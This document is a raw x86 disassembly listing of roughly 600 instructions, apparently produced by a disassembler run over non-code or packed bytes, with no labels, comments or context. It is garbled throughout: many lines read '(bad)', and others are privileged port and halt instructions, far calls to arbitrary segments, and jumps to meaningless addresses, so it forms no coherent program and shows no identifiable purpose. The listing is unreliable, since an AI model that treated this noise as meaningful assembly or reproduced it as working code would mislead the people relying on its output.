  4178b6:	test   edi,eax
  4178b8:	xor    DWORD PTR [esi],edx
  4178ba:	dec    DWORD PTR [ecx-0x138a054e]
  4178c0:	pop    eax
  4178c1:	std    
  4178c2:	push   edx
  4178c3:	test   BYTE PTR [ecx-0x25b30001],bh
  4178c9:	mov    cl,0x99
  4178cb:	pop    ebp
  4178cc:	add    cl,BYTE PTR [edi-0x18]
  4178cf:	mul    DWORD PTR [ecx]
  4178d1:	std    
  4178d2:	jmp    DWORD PTR [ebx+0x75e8ed3d]
  4178d8:	enter  0xff20,0x32
  4178dc:	mov    dh,0xfd
  4178de:	(bad)  
  4178df:	jnp    0x4178c0
  4178e1:	jo     0x4178e3
  4178e3:	jne    0x417940
  4178e5:	jmp    0x1daa7d9
  4178ea:	std    
  4178eb:	push   0x3fef33
  4178f0:	add    BYTE PTR [eax],al
  4178f2:	add    BYTE PTR [eax],al
  4178f4:	jne    0x4178e9
  4178f6:	shr    al,0x2
  4178f9:	in     eax,dx
  4178fa:	xchg   BYTE PTR [esi+0x69],al
  4178fd:	loopne 0x4178b4
  4178ff:	pop    es
  417900:	cld    
  417901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417902:	push   ebp
  417903:	sub    ebp,0xee67cf57
  417909:	pop    eax
  41790a:	cmp    al,0x69
  41790d:	leave  
  41790e:	loope  0x417948
  417910:	cmp    BYTE PTR [edi-0x34],bl
  417913:	pop    ebx
  417914:	(bad)  
  417915:	adc    BYTE PTR [eax],al
  417917:	cmc    
  417918:	mov    ah,0x5b
  41791a:	add    DWORD PTR [eax],eax
  41791c:	xchg   ebp,eax
  41791d:	scas   eax,DWORD PTR es:[edi]
  41791e:	mov    edi,0xcb2fad80
  417923:	cmp    al,0xa3
  417925:	call   0xc05:0xd05f7402
  41792c:	test   eax,0xbd010418
  417931:	fisttp QWORD PTR [eax]
  417933:	int3   
  417934:	ss pop ebx
  417936:	imul   esi,DWORD PTR [ebp+0x55],0xb584015a
  41793d:	out    dx,eax
  41793e:	and    ch,bh
  417940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417941:	loopne 0x417948
  417943:	or     BYTE PTR [ecx],bh
  417945:	sbb    BYTE PTR [ecx+eax*1],al
  417948:	jo     0x4179a9
  41794a:	inc    ebp
  41794b:	inc    ecx
  41794c:	jne    0x417936
  41794e:	mov    al,0xfc
  417950:	push   0x753fedef
  417955:	add    dh,BYTE PTR [edx+0x0]
  417958:	add    BYTE PTR [eax],al
  41795a:	add    BYTE PTR [eax],al
  41795c:	add    ah,dh
  41795e:	inc    ebp
  41795f:	jmp    0x417963
  417961:	jbe    0x417961
  417963:	and    al,al
  417965:	xor    bh,BYTE PTR [eax-0x34]
  417968:	or     edi,esp
  41796a:	add    BYTE PTR [eax],dl
  41796c:	mov    edi,0x801f011e
  417971:	sahf   
  417972:	dec    esi
  417973:	jecxz  0x417945
  417975:	jmp    0x2602:0xb44836d9
  41797c:	out    dx,al
  41797d:	pop    esi
  41797e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417980:	add    edi,eax
  417982:	(bad)  
  417983:	inc    BYTE PTR [edi-0x4195a5ca]
  417989:	fsubp  st(1),st
  41798b:	sar    DWORD PTR [esi+edi*2-0x24ec9703],0x4c
  417993:	test   BYTE PTR [edi],0xb5
  417996:	or     BYTE PTR [edi+ebx*2-0x4d5916d8],ah
  41799d:	leave  
  41799e:	sub    DWORD PTR [edx+0x3d],eax
  4179a1:	mov    bh,0x5
  4179a3:	out    0xb9,eax
  4179a5:	std    
  4179a6:	push   ecx
  4179a7:	into   
  4179a8:	fidiv  DWORD PTR [edx+0x5a]
  4179ab:	mov    dl,0x24
  4179ad:	mov    ds:0x6adabe4c,al
  4179b2:	pop    edx
  4179b3:	stos   BYTE PTR es:[edi],al
  4179b4:	and    al,0x92
  4179b6:	dec    esp
  4179b7:	scas   al,BYTE PTR es:[edi]
  4179b8:	fisubr DWORD PTR [esi+0x5a]
  4179bb:	bound  esp,QWORD PTR [edx+eax*4]
  4179be:	dec    esp
  4179bf:	sahf   
  4179c0:	fiadd  DWORD PTR [eax]
  4179c2:	add    BYTE PTR [eax],al
  4179c4:	add    BYTE PTR [eax],al
  4179c6:	dec    esi
  4179c7:	pop    edx
  4179c8:	pop    edx
  4179c9:	and    al,0x72
  4179cb:	dec    esp
  4179cc:	mov    ds,edx
  4179ce:	call   0x7e4c:0x6224525a
  4179d5:	fisub  DWORD PTR [esi-0x66b5ffa6]
  4179db:	dec    ebx
  4179dc:	std    
  4179dd:	bound  ebp,QWORD PTR [edi]
  4179df:	or     al,0x83
  4179e1:	pop    edi
  4179e2:	sbb    eax,0x9917fcf9
  4179e7:	outs   dx,DWORD PTR ds:[esi]
  4179e8:	and    al,ch
  4179ea:	jbe    0x4179a0
  4179ec:	out    0x5e,eax
  4179ee:	push   ecx
  4179ef:	dec    ebx
  4179f0:	std    
  4179f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f2:	mov    ebx,0xbee5764d
  4179f7:	jg     0x417a19
  4179f9:	call   0xe1b7c774
  4179fe:	scas   al,BYTE PTR es:[edi]
  4179ff:	(bad)  
  417a00:	pop    ds
  417a01:	call   0xf9b7c77c
  417a06:	sahf   
  417a07:	iret   
  417a08:	pop    ds
  417a09:	call   0x6296bb84
  417a0e:	cmp    DWORD PTR [edi-0x3],edi
  417a11:	jge    0x4179ef
  417a13:	mov    ch,0x88
  417a15:	idiv   BYTE PTR [ebx-0x5515e7ab]
  417a1b:	pop    ds
  417a1c:	or     al,0x6a
  417a1e:	push   edi
  417a1f:	jmp    0x2efd:0x4d27b7e7
  417a26:	pushf  
  417a27:	push   eax
  417a28:	pop    esi
  417a29:	add    BYTE PTR ss:[eax],al
  417a2c:	add    BYTE PTR [eax],al
  417a2e:	add    BYTE PTR [eax-0x45],dl
  417a31:	pop    ds
  417a32:	call   0xd5ca29ad
  417a37:	sti    
  417a38:	data16 clc 
  417a3a:	jb     0x4179e9
  417a3c:	add    eax,DWORD PTR [ecx+0x55b2e2c5]
  417a42:	push   ss
  417a43:	rol    BYTE PTR es:[ebx],cl
  417a46:	je     0x4179f2
  417a48:	pop    ds
  417a49:	cmp    BYTE PTR [ecx-0x6902d557],dl
  417a4f:	cli    
  417a50:	inc    ecx
  417a51:	or     eax,0xfd4bda65
  417a56:	add    BYTE PTR [esp+esi*8-0x2a],cl
  417a5a:	adc    ax,WORD PTR [ebx+0x21]
  417a5e:	adc    al,0x5c
  417a60:	push   es
  417a61:	mov    BYTE PTR [eax+esi*1+0x54],bl
  417a65:	in     eax,0x1f
  417a67:	and    DWORD PTR [esi],eax
  417a69:	add    BYTE PTR [ebx+0x44be009c],cl
  417a6f:	adc    BYTE PTR [ebx+0xc],0xbe
  417a73:	rol    BYTE PTR [edx],1
  417a75:	adc    al,0x53
  417a77:	call   DWORD PTR [ebx+0x4a5b564d]
  417a7d:	test   eax,0x55fedc15
  417a82:	mov    eax,edx
  417a84:	and    bl,BYTE PTR [eax+ebp*8]
  417a87:	push   edi
  417a88:	push   eax
  417a89:	(bad)  
  417a8a:	call   DWORD PTR ds:0xdb18219b
  417a90:	cmp    BYTE PTR [esi],0x1
  417a93:	add    BYTE PTR [eax],al
  417a95:	add    BYTE PTR [eax],al
  417a97:	add    ah,bl
  417a99:	dec    BYTE PTR [esi+0x53]
  417a9c:	push   es
  417a9d:	add    al,0x4f
  417a9f:	push   ebx
  417aa0:	(bad)  [ebx]
  417aa2:	and    DWORD PTR [ebx+ecx*8+0x33],edx
  417aa6:	and    DWORD PTR [ebx+ebx*8+0x33],ecx
  417aaa:	and    DWORD PTR [ebx+ebx*8],esi
  417aad:	push   edx
  417aae:	rcl    DWORD PTR ds:0x4485068c,0x80
  417ab5:	sbb    dh,BYTE PTR [edi]
  417ab7:	ret    
  417ab8:	retf   
  417ab9:	adc    BYTE PTR [eax],0x1
  417abc:	mov    esi,?
  417abe:	xchg   BYTE PTR [ebp-0x5c],al
  417ac1:	int    0xff
  417ac3:	jg     0x417b09
  417ac5:	pop    esi
  417ac6:	(bad)  
  417ac7:	mov    ebp,0x3d27c4
  417acc:	pusha  
  417acd:	add    edi,DWORD PTR [esi-0x2b99d00]
  417ad3:	xor    dh,BYTE PTR [ebp-0x5e]
  417ad6:	test   BYTE PTR [ecx+edx*4+0x1d],bh
  417ada:	push   es
  417adb:	push   ecx
  417adc:	jb     0x417a84
  417ade:	inc    eax
  417adf:	inc    edi
  417ae0:	hlt    
  417ae1:	jp     0x417ae7
  417ae3:	add    ch,dh
  417ae5:	pop    ebx
  417ae6:	add    bh,0x75
  417ae9:	sar    bh,1
  417aeb:	and    DWORD PTR [esp+ecx*4+0x336d7050],0x5d
  417af3:	jbe    0x417aaa
  417af5:	pop    ebx
  417af6:	push   eax
  417af7:	je     0x417b4a
  417af9:	addr16 mov bh,0xfc
  417afc:	add    BYTE PTR [eax],al
  417afe:	add    BYTE PTR [eax],al
  417b00:	add    BYTE PTR [ecx-0x7f033c09],ch
  417b06:	xor    ebp,0x3f
  417b09:	jne    0x417aef
  417b0b:	push   ebx
  417b0c:	cmp    DWORD PTR [esi],eax
  417b0e:	sub    DWORD PTR [ebp+0x15b75b6],eax
  417b14:	push   0x5e
  417b16:	(bad)  
  417b17:	iret   
  417b18:	and    edi,DWORD PTR ds:0x10875993
  417b1e:	pop    esp
  417b1f:	add    DWORD PTR [eax+0x75],ebp
  417b22:	pop    ebx
  417b23:	add    DWORD PTR [eax-0x3a83b7b1],esp
  417b29:	and    eax,0x1135069
  417b2e:	das    
  417b2f:	sar    edi,0x4c
  417b32:	add    eax,0x13917c7d
  417b37:	lods   al,BYTE PTR ds:[esi]
  417b38:	out    0x21,eax
  417b3a:	jbe    0x417b3d
  417b3c:	add    dh,bh
  417b3e:	mov    dh,0xfb
  417b40:	mov    BYTE PTR [edx+0x2],bh
  417b43:	lods   al,BYTE PTR ds:[esi]
  417b44:	pop    ds
  417b45:	and    ecx,DWORD PTR [edi+0x50]
  417b48:	jo     0x417bbb
  417b4a:	faddp  st(4),st
  417b4c:	and    edi,DWORD PTR ds:0x59447ceb
  417b52:	add    cl,bl
  417b54:	mov    bl,0x92
  417b56:	retf   0x2ed
  417b59:	jne    0x417ae0
  417b5b:	stos   DWORD PTR es:[edi],eax
  417b5c:	push   edi
  417b5e:	inc    ecx
  417b5f:	or     eax,0xe702daed
  417b64:	add    eax,DWORD PTR [eax]
  417b66:	add    BYTE PTR [eax],al
  417b68:	add    BYTE PTR [eax],al
  417b6a:	adc    eax,0xc9507ddc
  417b6f:	push   ds
  417b70:	retf   
  417b71:	mov    ecx,0xf632ef49
  417b76:	add    BYTE PTR [edx],0x66
  417b79:	xlat   BYTE PTR ds:[ebx]
  417b7a:	xchg   esi,eax
  417b7b:	out    0x4e,al
  417b7d:	stc    
  417b7e:	xchg   ecx,eax
  417b7f:	add    esp,edi
  417b81:	jl     0x417bf3
  417b83:	dec    ecx
  417b84:	xlat   BYTE PTR ds:[ebx]
  417b85:	sbb    esp,DWORD PTR [eax]
  417b87:	ror    BYTE PTR [edx],cl
  417b89:	mov    ch,0xc5
  417b8b:	mov    al,0x3d
  417b8d:	mul    dl
  417b8f:	out    dx,al
  417b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b91:	add    esi,esp
  417b93:	dec    ecx
  417b94:	call   0x73f6c06f
  417b99:	(bad)  
  417b9a:	push   esi
  417b9b:	push   ss
  417b9c:	mov    bh,0x7e
  417b9e:	cmp    DWORD PTR [esi],ebx
  417ba0:	mov    edi,0xe6f552b3
  417ba5:	add    edx,DWORD PTR [ebp-0x6938d250]
  417bab:	push   es
  417bac:	jecxz  0x417bb1
  417bae:	jne    0x417bb2
  417bb0:	pusha  
  417bb1:	scas   eax,DWORD PTR es:[edi]
  417bb2:	xchg   esi,eax
  417bb3:	push   cs
  417bb4:	out    dx,al
  417bb5:	cmc    
  417bb6:	add    ch,bh
  417bb8:	es add al,0xf4
  417bbb:	dec    ecx
  417bbc:	call   0x53c4f899
  417bc1:	sub    BYTE PTR [ebp+0x3a],dl
  417bc4:	out    0x3,eax
  417bc6:	jne    0x417b96
  417bc8:	sub    eax,0x8eee99b6
  417bcd:	stc    
  417bce:	add    BYTE PTR [eax],al
  417bd0:	add    BYTE PTR [eax],al
  417bd2:	add    BYTE PTR [edx+0x2],dl
  417bd5:	add    BYTE PTR [esi-0x51dbdb53],dh
  417bdb:	jl     0x417b7d
  417bdd:	adc    ebp,DWORD PTR [ecx]
  417bdf:	jno    0x417c28
  417be1:	je     0x417ba8
  417be3:	pop    esi
  417be4:	inc    edi
  417be5:	adc    eax,DWORD PTR [ecx+0x6c]
  417be8:	or     BYTE PTR [eax],al
  417bea:	(bad)  
  417beb:	sub    eax,0x45691124
  417bf0:	and    al,0x11
  417bf2:	jmp    0x417c47
  417bf4:	add    BYTE PTR [ecx-0x2ba4589],0xf5
  417bfb:	call   0xfd49:0x4b82e80e
  417c02:	pop    esi
  417c03:	dec    ebp
  417c04:	and    al,0x38
  417c06:	inc    ecx
  417c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c08:	call   0xa615650b
  417c0d:	xor    BYTE PTR [ecx],ch
  417c0f:	into   
  417c10:	jp     0x417bf5
  417c12:	pushf  
  417c13:	mov    ah,0xfe
  417c15:	push   DWORD PTR ds:0x4134242d
  417c1b:	xor    esp,esi
  417c1d:	(bad)  
  417c1e:	call   0xe1654ace
  417c23:	dec    esi
  417c24:	rcr    DWORD PTR ds:0x1bdc76e8,cl
  417c2a:	pusha  
  417c2b:	retf   0x8aff
  417c2e:	test   DWORD PTR [edx-0x3ceea7ee],edx
  417c34:	mov    ds:0xe900,eax
  417c39:	add    BYTE PTR [eax],al
  417c3b:	add    BYTE PTR [ecx-0x5a],cl
  417c3e:	and    ecx,ebp
  417c40:	pop    ds
  417c41:	test   al,0x69
  417c43:	adc    eax,0x258b029f
  417c48:	pop    ebp
  417c49:	and    dl,BYTE PTR [eax+0x62]
  417c4c:	mov    dl,0x23
  417c4e:	and    BYTE PTR [esi],dh
  417c50:	inc    ecx
  417c51:	pop    eax
  417c52:	add    eax,0x53038d00
  417c57:	mov    DWORD PTR [eax+0x1a],ebx
  417c5a:	sub    al,ch
  417c5c:	pop    edi
  417c5d:	pop    eax
  417c5e:	(bad)  
  417c5f:	call   DWORD PTR [edi]
  417c61:	aas    
  417c62:	and    DWORD PTR [edi+ecx*1],esp
  417c65:	mov    ebx,0xf45474fa
  417c6a:	cli    
  417c6b:	cmp    ebx,DWORD PTR [edi]
  417c6d:	sub    eax,0x1a988b26
  417c72:	sbb    BYTE PTR [ebp+0x18357b48],cl
  417c78:	dec    eax
  417c79:	dec    edx
  417c7a:	cld    
  417c7b:	xor    bl,al
  417c7d:	dec    edx
  417c7e:	rcl    DWORD PTR [edx],0x8c
  417c81:	dec    BYTE PTR [edi-0x75]
  417c84:	or     BYTE PTR [edi],bl
  417c86:	sbb    al,0xff
  417c88:	mov    BYTE PTR [esi-0x18],dh
  417c8b:	push   ebp
  417c8c:	outs   dx,BYTE PTR ds:[esi]
  417c8d:	mov    eax,0x1ed88bfa
  417c92:	and    al,0x47
  417c94:	ja     0x417c4c
  417c96:	jno    0x417c6f
  417c98:	xchg   DWORD PTR [edi],esi
  417c9a:	and    DWORD PTR [eax],ebx
  417c9c:	mov    ah,0x55
  417c9e:	sbb    eax,DWORD PTR [ecx]
  417ca0:	add    BYTE PTR [eax],al
  417ca2:	add    BYTE PTR [eax],al
  417ca4:	add    BYTE PTR [edx+eax*4],cl
  417ca7:	inc    esp
  417ca8:	and    al,0x70
  417caa:	mov    cs,WORD PTR [edx+0x4d5ab844]
  417cb0:	lea    ebx,[eax]
  417cb2:	pop    ds
  417cb3:	xor    al,0x50
  417cb5:	sub    ch,BYTE PTR [ebx+0x2cd744b]
  417cbb:	xchg   eax,edi
  417cbd:	mov    bh,0xbb
  417cbf:	jo     0x417c48
  417cc1:	jne    0x417c56
  417cc3:	cld    
  417cc4:	call   ebx
  417cc6:	mov    cs,WORD PTR [eax+0x50937dec]
  417ccc:	push   esi
  417ccd:	and    eax,0x75db2efd
  417cd2:	loop   0x417c7e
  417cd4:	pop    es
  417cd5:	mov    ds:0x25fd07a9,al
  417cda:	push   ecx
  417cdb:	pop    ecx
  417cdc:	lods   al,BYTE PTR ds:[esi]
  417cdd:	mov    dl,0x87
  417cdf:	dec    ebx
  417ce0:	mov    eax,DWORD PTR [edx]
  417ce2:	push   ebp
  417ce3:	mov    cl,0x86
  417ce5:	jnp    0x417c7f
  417ce7:	cmc    
  417ce8:	ret    
  417ce9:	sbb    DWORD PTR [si],eax
  417cec:	xchg   DWORD PTR [eax+0x69437d67],edi
  417cf2:	or     al,0xb6
  417cf4:	out    0x99,eax
  417cf6:	jae    0x417d43
  417cf8:	std    
  417cf9:	out    dx,al
  417cfa:	push   ebp
  417cfb:	js     0x417d48
  417cfd:	push   ecx
  417cfe:	aam    0xef
  417d00:	dec    BYTE PTR [ebp-0x59de2ad3]
  417d06:	call   0x41e4bd
  417d0b:	add    BYTE PTR [eax],al
  417d0d:	add    BYTE PTR [ebx],dl
  417d0f:	cmp    al,0xc2
  417d11:	inc    edi
  417d13:	mov    BYTE PTR [ebx+edx*1+0x9],cl
  417d17:	dec    edx
  417d18:	sar    edi,0xed
  417d1b:	pushf  
  417d1c:	std    
  417d1d:	cmp    BYTE PTR [esi],dh
  417d1f:	mov    BYTE PTR ds:0xf8b074b0,al
  417d25:	cld    
  417d26:	inc    ebx
  417d27:	ret    
  417d28:	sbb    DWORD PTR [ebx],0xc00f5b74
  417d2e:	fwait
  417d2f:	inc    eax
  417d30:	cmp    al,cl
  417d32:	dec    eax
  417d33:	rcr    BYTE PTR [edi+0x4f],1
  417d36:	inc    esp
  417d37:	fsub   st,st(4)
  417d39:	div    DWORD PTR [ebp-0x74]
  417d3c:	adc    ch,bh
  417d3e:	pushf  
  417d3f:	jle    0x417d3a
  417d41:	jae    0x417d86
  417d43:	ins    DWORD PTR es:[edi],dx
  417d44:	js     0x417d79
  417d46:	pop    ebp
  417d47:	es sar edi,0xf1
  417d4b:	sahf   
  417d4c:	dec    ecx
  417d4d:	push   eax
  417d4e:	and    al,BYTE PTR [edx]
  417d50:	je     0x417d18
  417d52:	scas   al,BYTE PTR es:[edi]
  417d53:	mov    dl,0x50
  417d55:	add    ch,BYTE PTR [eax-0x34b32131]
  417d5b:	jg     0x417d04
  417d5d:	(bad)  
  417d5e:	fs jns 0x417d8d
  417d61:	dec    esp
  417d62:	test   BYTE PTR [edx+0x33],0x19
  417d66:	hlt    
  417d67:	inc    edx
  417d68:	jmp    0xdb9bd444
  417d6d:	out    dx,al
  417d6e:	jnp    0x417db5
  417d70:	jb     0x417dbd
  417d72:	add    BYTE PTR [eax],al
  417d74:	add    BYTE PTR [eax],al
  417d76:	add    dh,dh
  417d78:	inc    esp
  417d79:	adc    ebp,ecx
  417d7b:	(bad)  
  417d7c:	mov    esi,0xcf61b3de
  417d81:	mov    ?,WORD PTR [esp+ecx*8+0x7ad68600]
  417d88:	inc    ebp
  417d89:	xchg   ebp,eax
  417d8a:	xchg   BYTE PTR ds:0x5ab4decf,dh
  417d90:	and    cl,ah
  417d92:	add    dh,BYTE PTR [ebp+0x11]
  417d95:	lods   ax,WORD PTR ds:[esi]
  417d97:	std    
  417d98:	cmp    al,0xbe
  417d9a:	cmp    dh,BYTE PTR [edi]
  417d9c:	(bad)  
  417d9d:	out    0xb0,al
  417d9f:	leave  
  417da0:	inc    ebp
  417da1:	shl    DWORD PTR [edi],cl
  417da3:	imul   edx,DWORD PTR [eax],0x44fe5b22
  417da9:	ds dec esp
  417dab:	cld    
  417dac:	dec    ecx
  417dad:	ins    BYTE PTR es:[edi],dx
  417dae:	dec    esp
  417daf:	mov    DWORD PTR [ecx],ebx
  417db1:	xchg   ebp,eax
  417db2:	dec    esp
  417db3:	sbb    DWORD PTR [esi],0x456e5bfb
  417db9:	push   ds
  417dba:	dec    esp
  417dbb:	cld    
  417dbc:	push   ecx
  417dbd:	ins    BYTE PTR es:[edi],dx
  417dbe:	push   ebp
  417dbf:	imul   ebp,esi,0xeed9b4b4
  417dc5:	inc    esi
  417dc6:	icebp  
  417dc7:	xchg   edx,eax
  417dc8:	add    ah,BYTE PTR [ebx+eax*2+0x46]
  417dcc:	add    BYTE PTR [eax],al
  417dce:	test   DWORD PTR [edx-0x35f11854],0x513efd43
  417dd8:	sub    eax,0xe81c
  417ddd:	add    BYTE PTR [eax],al
  417ddf:	add    BYTE PTR [esi-0x5c],dh
  417de2:	pop    esp
  417de3:	arpl   WORD PTR [edx],di
  417de5:	stos   DWORD PTR es:[edi],eax
  417de6:	shl    ecx,0x76
  417de9:	inc    edi
  417dea:	je     0x417df9
  417dec:	jne    0x417e35
  417dee:	adc    esi,DWORD PTR [ecx]
  417df0:	test   BYTE PTR [eax+eax*1],al
  417df3:	sbb    DWORD PTR [ecx],esp
  417df5:	fwait
  417df6:	std    
  417df7:	scas   al,BYTE PTR es:[edi]
  417df8:	cs jle 0x417dbb
  417dfb:	sbb    al,0x6f
  417dfd:	inc    edi
  417dfe:	je     0x417dc5
  417e00:	push   0x47
  417e02:	adc    esi,DWORD PTR [ecx]
  417e04:	fs add al,0x0
  417e07:	fs mov cl,0xce
  417e0a:	add    BYTE PTR [edx-0x1a3e3d4a],bh
  417e10:	jbe    0x417dc1
  417e12:	mov    BYTE PTR [ebp+0x1a2c56fa],al
  417e18:	pop    es
  417e19:	adc    ebx,ecx
  417e1b:	mov    esi,0xa1e3cfad
  417e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e21:	add    al,BYTE PTR [eax]
  417e23:	jmp    0x423e25c6
  417e28:	dec    ebp
  417e29:	mov    al,ds:0x2ffe900
  417e2e:	add    cl,ch
  417e30:	push   es
  417e31:	scas   eax,DWORD PTR es:[edi]
  417e32:	push   eax
  417e33:	bound  esi,QWORD PTR [edi+0x42d4fcb2]
  417e39:	out    dx,al
  417e3a:	aas    
  417e3b:	jmp    0xe3393db1
  417e40:	xor    ecx,edi
  417e42:	adc    al,0xba
  417e44:	add    BYTE PTR [eax],al
  417e46:	add    BYTE PTR [eax],al
  417e48:	add    BYTE PTR [edi],ah
  417e4a:	mov    bl,0x88
  417e4c:	daa    
  417e4d:	and    DWORD PTR [edi+0x13],eax
  417e50:	add    BYTE PTR [eax],cl
  417e52:	push   ebx
  417e53:	cmp    eax,0xf5414500
  417e58:	cmp    ecx,DWORD PTR [edi-0x33587eb9]
  417e5e:	(bad)  
  417e5f:	(bad)  
  417e60:	(bad)  
  417e61:	mov    cl,0x87
  417e63:	adc    al,BYTE PTR [eax-0x64]
  417e66:	mov    eax,0x4215f870
  417e6b:	icebp  
  417e6c:	call   0x3c359b
  417e71:	and    BYTE PTR [edi-0xee7bf6],bh
  417e77:	(bad)  
  417e78:	call   DWORD PTR [edi]
  417e7a:	inc    edx
  417e7b:	add    eax,0x38465189
  417e80:	ret    
  417e81:	xchg   ecx,eax
  417e82:	dec    esp
  417e83:	mov    al,BYTE PTR [ebp+0x20]
  417e86:	mov    BYTE PTR [eax+0x8],0xd7
  417e8a:	scas   eax,DWORD PTR es:[edi]
  417e8b:	mov    bh,0x97
  417e8d:	dec    esp
  417e8e:	(bad)  
  417e8f:	jmp    edi
  417e91:	jne    0x417e2f
  417e93:	add    BYTE PTR [eax],al
  417e95:	arpl   WORD PTR [ebx+0x4741ff50],cx
  417e9b:	cld    
  417e9c:	adc    eax,0x3d5190
  417ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ea2:	scas   eax,DWORD PTR es:[edi]
  417ea3:	ss repz inc ecx
  417ea6:	push   ebx
  417ea7:	push   eax
  417ea8:	push   edi
  417ea9:	fisttp WORD PTR [ebx+0xff50]
  417eaf:	add    BYTE PTR [eax],al
  417eb1:	add    BYTE PTR [ecx+0x47],al
  417eb4:	cld    
  417eb5:	adc    eax,0x3d51d8
  417eba:	xchg   DWORD PTR [edi-0xf3f0cca],ebp
  417ec0:	cli    
  417ec1:	adc    eax,0x3d4e0c
  417ec6:	sub    al,0xb8
  417ec8:	adc    BYTE PTR [ecx+eiz*8+0x3e],dl
  417ecc:	std    
  417ecd:	push   ebp
  417ece:	jne    0x417e59
  417ed0:	pop    ecx
  417ed1:	(bad)  
  417ed3:	repz dec ecx
  417ed5:	test   BYTE PTR [ebp-0x35aa093b],dh
  417edb:	sub    eax,0x593512e9
  417ee0:	jns    0x417f3d
  417ee2:	mov    edx,0x797440dd
  417ee7:	xchg   ebx,eax
  417ee8:	mov    ebp,0x470b74fc
  417eed:	adc    eax,DWORD PTR [ecx+0x62ffc146]
  417ef3:	push   ss
  417ef4:	inc    edi
  417ef5:	jae    0x417e77
  417ef7:	add    ah,BYTE PTR [ebp+0x485101f3]
  417efd:	jae    0x417e88
  417eff:	inc    eax
  417f00:	push   ecx
  417f01:	(bad)  
  417f02:	jp     0x417e97
  417f04:	inc    edi
  417f05:	jae    0x417f74
  417f07:	imul   ebp,ebp,0x3eb804f
  417f0d:	mov    bh,BYTE PTR [eax-0x41a25868]
  417f13:	bound  eax,QWORD PTR [esi+0x4]
  417f16:	add    BYTE PTR [eax],al
  417f18:	add    BYTE PTR [eax],al
  417f1a:	add    BYTE PTR [ebp+0x1e],dh
  417f1d:	jnp    0x417f0b
  417f1f:	hlt    
  417f20:	(bad)  
  417f21:	mov    WORD PTR [ebx],es
  417f23:	jne    0x417f50
  417f25:	scas   eax,DWORD PTR es:[edi]
  417f26:	push   esp
  417f27:	iret   
  417f28:	pop    ebx
  417f29:	(bad)  
  417f2b:	(bad)  
  417f2c:	mov    ah,0x4b
  417f2e:	std    
  417f2f:	cmp    BYTE PTR [ebx-0x11],0x3f
  417f33:	jne    0x417ee1
  417f35:	aas    
  417f36:	or     al,0xf5
  417f38:	dec    esi
  417f39:	stc    
  417f3a:	dec    DWORD PTR [ecx+0x797b843f]
  417f40:	sub    ecx,ebp
  417f42:	and    al,0xf8
  417f44:	clc    
  417f45:	iret   
  417f46:	and    dl,bh
  417f48:	jbe    0x417f3f
  417f4a:	mov    BYTE PTR [edx-0xfcff0fe],bh
  417f50:	add    esp,edi
  417f52:	jp     0x417f8a
  417f54:	ds ins BYTE PTR es:[edi],dx
  417f56:	inc    esp
  417f57:	pop    ebx
  417f58:	adc    al,0xb6
  417f5a:	dec    eax
  417f5b:	inc    esi
  417f5c:	push   cs
  417f5d:	cvttps2pi mm5,QWORD PTR [ebx+eax*1-0x19]
  417f62:	jl     0x417f29
  417f64:	mov    esi,DWORD PTR [edi+esi*8-0x9]
  417f68:	cmp    BYTE PTR [ebx+edi*4+0x65],dh
  417f6c:	inc    edx
  417f6d:	ror    BYTE PTR [edx-0x718fd8b],1
  417f73:	call   0x26fd5e3f
  417f78:	adc    BYTE PTR [edi],bl
  417f7a:	iret   
  417f7b:	mov    eax,ds:0xf82c8f
  417f80:	add    BYTE PTR [eax],al
  417f82:	add    BYTE PTR [eax],al
  417f84:	cmp    ch,BYTE PTR [edx+0x27503af]
  417f8a:	ret    0xeffa
  417f8d:	(bad)  
  417f8e:	fidiv  DWORD PTR [ebx+0x3e74cda]
  417f94:	jne    0x417fc0
  417f96:	fdiv   DWORD PTR [esi+0x53624161]
  417f9c:	div    BYTE PTR [edi]
  417f9e:	adc    esi,DWORD PTR [esp+edi*8]
  417fa1:	(bad)  
  417fa2:	repnz mov cl,0x52
  417fa5:	test   BYTE PTR [esi+0x2],ah
  417fa8:	jne    0x417f35
  417faa:	sub    al,0x48
  417fac:	test   BYTE PTR [ecx-0x12],0xfb
  417fb0:	enter  0x22a,0xed
  417fb4:	sub    eax,DWORD PTR [ecx+0x52]
  417fb7:	mov    ebp,esi
  417fb9:	jle    0x417f5a
  417fbb:	dec    ebp
  417fbc:	sbb    BYTE PTR [ecx+0x3f],al
  417fbf:	sub    edi,ebx
  417fc1:	add    ah,bh
  417fc3:	fisttp QWORD PTR [edx]
  417fc5:	mov    fs,WORD PTR [edx+eiz*2+0x3]
  417fc9:	inc    ecx
  417fca:	add    BYTE PTR [esi],dh
  417fcc:	(bad)  
  417fcd:	mov    DWORD PTR [ebx-0x23],eax
  417fd0:	xchg   ecx,eax
  417fd1:	(bad)  
  417fd4:	lods   al,BYTE PTR ds:[esi]
  417fd5:	sub    dl,BYTE PTR [edi-0x76fd894e]
  417fdb:	adc    DWORD PTR [edi-0x43],ebx
  417fde:	sti    
  417fdf:	fs cmp eax,0xb369cdb6
  417fe5:	or     BYTE PTR [eax],al
  417fe7:	jb     0x417fe9
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    BYTE PTR [eax],al
  417fed:	jne    0x417f7a
  417fef:	inc    eax
  417ff0:	aad    0x3f
  417ff2:	add    esi,DWORD PTR [eax+ebx*8+0x3d]
  417ff6:	mul    edi
  417ff8:	ret    0x3f9f
  417ffb:	std    
  417ffc:	ss inc ecx
  417ffe:	push   ebp
  417fff:	sbb    ch,al
  418001:	jbe    0x417f86
  418003:	arpl   bp,cx
  418005:	jns    0x417fb1
  418007:	scas   eax,DWORD PTR es:[edi]
  418008:	in     al,dx
  418009:	jbe    0x41800d
  41800b:	mov    esp,DWORD PTR [ecx+eax*8+0x3a]
  41800f:	std    
  418010:	mov    dh,0x9f
  418012:	inc    eax
  418013:	dec    ebp
  418014:	scas   al,BYTE PTR es:[edi]
  418015:	rcl    BYTE PTR fs:0x43897129,1
  41801c:	in     eax,dx
  41801d:	test   DWORD PTR [esi+0xc],0x1aa0b39
  418024:	pusha  
